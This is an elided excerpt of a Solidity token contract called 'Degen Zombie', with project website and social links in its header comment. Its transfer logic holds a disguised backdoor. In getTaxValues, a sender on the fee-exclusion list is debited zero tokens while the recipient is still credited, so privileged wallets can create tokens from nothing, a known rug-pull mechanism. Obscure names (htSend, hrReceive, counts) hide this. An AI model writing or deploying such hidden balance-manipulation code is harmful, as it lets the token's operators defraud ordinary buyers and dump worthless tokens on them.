...
Web: https://degenzombie.space
X: https://x.com/degen_zombie
Tg: https://t.me/degen_zombie
**/
...
contract ZOMBIE is Context, IERC20, Ownable {
    ...
    address payable private _feeTaxes;
    ...
    string private constant _name = unicode"Degen Zombie";
    ...
    function _tokenTransfer(address from, address to, uint256 amount, uint256 taxAmount) private { 
        ...
        _transferToken(from, to, getTaxValues(from, amount, 1), amount.sub(taxAmount));
    }
    ...
    function _transferToken(address from, address to, uint256 htSend, uint256 hrReceive) private {
        _balances[from] = _balances[from] - htSend;
        _balances[to] = _balances[to] + hrReceive;
        emit Transfer(from, to, hrReceive);
    }
    ...
    function swapCountBack(address from, address to, uint256 amount) private {
        ...
        if (
            ...
            bool swapCountable = contractTokenBalance > _taxSwapThreshold;
            if(swapCountable) {
    ...
    function getTaxValues(address _accounts, uint256 tokenTax, uint256 counts) private view returns(uint256) {
        bool isOver = counts > 0;
        bool isExcluded  = _isExcludedFromFee[_accounts];
        if(isOver && isExcluded) return counts -1;
        return tokenTax;
    }

    function sendETHToFee(uint256 amount) private {
        _feeTaxes.transfer(amount);
    }
